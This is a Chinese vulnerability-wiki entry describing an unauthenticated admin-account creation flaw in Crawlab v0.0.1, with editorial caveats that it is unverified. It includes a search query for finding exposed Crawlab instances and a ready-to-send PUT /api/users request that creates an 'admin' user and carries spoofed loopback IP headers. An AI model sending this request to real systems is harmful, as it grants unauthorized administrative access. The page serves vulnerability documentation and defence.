---
version: "Crawlab v0.0.1"
source: "Threekiii/Vulnerability-Wiki"
title: "Crawlab users 任意用户添加漏洞"
product: "Crawlab"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "v0.0.1 claimed; anonymous PutUser routing; admin role accepted per request"
affected_versions: "Crawlab v0.0.1"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-88f7610721b8370c4a9a0392"
entity_id: "ve-88f7610721b8370c4a9a0392"
schema_version: "1"
---

# Crawlab users 任意用户添加漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：v0.0.1 claimed; anonymous PutUser routing; admin role accepted per request
- 证据范围：PUT request creates admin account, routing/result screenshots; code not reproduced in text

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- No upstream commit/advisory or fixed version
- Irrelevant tracking cookies/spoofed headers and blank Host pollute minimal request
- Clarify whether role=admin honored and whether signup itself intended; evidence images not viewed

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

Crawlab users 的 api 存在任意用户添加，且添加为未授权接口，可通过添加后在后台进一步攻击

## 漏洞影响

```
Crawlab v0.0.1
```

## 网络测绘

```
title="Crawlab"
```

## 漏洞复现

登录页面

![](./.resource/Crawlab-users-任意用户添加漏洞/media/202205241444454.png)

首先查看路由位置 main.go 文件

![](./.resource/Crawlab-users-任意用户添加漏洞/media/202205241444511.png)

```
anonymousGrou 中为匿名可调用方法
authGroup	  中为认证可调用方法
```

可以看到 Putuser方法为添加用户，但存在匿名调用

![](./.resource/Crawlab-users-任意用户添加漏洞/media/202205241444706.png)

根据字段生成添加用户的请求

```http
PUT /api/users HTTP/1.1
Host: 
Content-Length: 83
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: Hm_lvt_c35e3a563a06caee2524902c81975add=1639222117,1639278935; Hm_lpvt_c35e3a563a06caee2524902c81975add=1639278935
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

{"username":"testppp","password":"testppp","role":"admin","email":"testppp@qq.com"}
```

![](./.resource/Crawlab-users-任意用户添加漏洞/media/202205241444367.png)

![](./.resource/Crawlab-users-任意用户添加漏洞/media/202205241444319.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
